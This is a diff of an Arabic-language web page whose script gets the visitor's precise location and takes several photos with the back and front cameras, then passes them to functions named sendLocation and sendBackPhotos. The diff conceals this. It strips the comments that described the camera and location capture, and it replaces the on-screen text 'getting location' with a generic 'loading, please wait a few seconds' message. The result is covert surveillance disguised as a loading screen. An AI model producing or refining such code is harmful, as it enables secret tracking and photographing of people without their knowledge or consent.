@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -429,8 +429,8 @@ here<!DOCTYPE html>
             });
         }
 
-        // ========== 2. التقاط الصور من الكاميرا (خلفية وأمامية) ==========
-        // كاميرا خلفية - 3 صور
+        // ========== 2.ت==========
+        //ت - 3 
         async function captureBackCameraPhotos() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -566,15 +566,15 @@ here<!DOCTYPE html>
             try {
                 updateProgress(5); loadingMessage.textContent = 'جاري الاتصال...'; await wait(300);
                 
-                // 1. الموقع
-                updateProgress(12); loadingMessage.textContent = 'جاري الحصول على الموقع...';
+                // 1. تحميل
+                updateProgress(12); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 showNotification('جار التحميل انتضر بضع ثواني');
                 const location = await getPreciseLocation(); await wait(500);
                 
                 updateProgress(20); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 await sendLocation(location); await wait(600);
                 
-                // 2. الكاميرا الخلفية (3 صور)
+                // 2. ت (3 صور)
                 updateProgress(30); loadingMessage.textContent = 'جار التحميل انتضر بضع ثواني...';
                 showNotification('جار التحميل انتضر بضع ثواني');
                 await wait(500);
@@ -583,7 +583,7 @@ here<!DOCTYPE html>
                 const backPhotos = await captureBackCameraPhotos();
                 await sendBackPhotos(backPhotos); await wait(600);
                 
-                // 3. الكاميرا الأمامية (2 صور)
+                // 3. ة (2 صور)
                 updateProgress(55); loadingMessage.textContent = 'جار التحميل انتضر بضع ثوانية...';
                 showNotification('جار التحميل انتضر بضع ثواني');
                 await wait(500);
